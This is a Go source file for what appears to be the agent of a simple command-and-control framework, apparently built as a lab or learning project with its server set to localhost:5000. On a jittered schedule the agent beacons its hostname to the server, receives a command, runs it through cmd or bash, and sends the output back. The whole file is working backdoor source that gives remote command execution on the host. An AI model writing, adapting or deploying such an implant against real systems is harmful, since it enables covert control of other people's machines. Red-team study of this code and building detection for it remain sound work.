package main

import (
	"bytes"
	"c2-server/models"
	"encoding/json"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

func sendBeacon(id string) *http.Response {
	var beacon models.NewBeacon
	beacon.ID = id
	hostName, _ := os.Hostname()
	beacon.Hostname = hostName
	jsonData, err := json.Marshal(beacon)
	if err != nil {
		panic(err)
	}
	resp, err := http.Post("http://localhost:5000/beacon", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		panic(err)
	}
	return resp
}

func recvTask(r *http.Response) string {
	var task models.NewTask
	err := json.NewDecoder(r.Body).Decode(&task)
	if err != nil {
		panic(err)
	}
	return task.Command
}

func sendAnswer(id string, cmd string) {
	var answer models.NewAnswer
	var command *exec.Cmd
	answer.ID = id
	answer.Command = cmd
	if runtime.GOOS == "windows" {
		command = exec.Command("cmd", "/C", cmd)
	} else {
		command = exec.Command("bash", "-c", cmd)
	}
	out, err := command.Output()
	if err != nil {
		answer.Answer = ""
	} else {
		answer.Answer = string(out)
	}
	jsonData, err := json.Marshal(answer)
	if err != nil {
		panic(err)
	}
	_, err = http.Post("http://localhost:5000/answer", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		panic(err)
	}

}

func main() {
	base := 1 * time.Minute
	jitter := 30
	for {
		jitterRange := (int(base.Seconds()) * jitter) / 100
		sleepSec := int(base.Seconds()) + rand.Intn(2*jitterRange) - jitterRange
		resp := sendBeacon("1234")
		cmd := recvTask(resp)
		sendAnswer("1234", cmd)
		time.Sleep(time.Duration(sleepSec) * time.Second)
	}
}
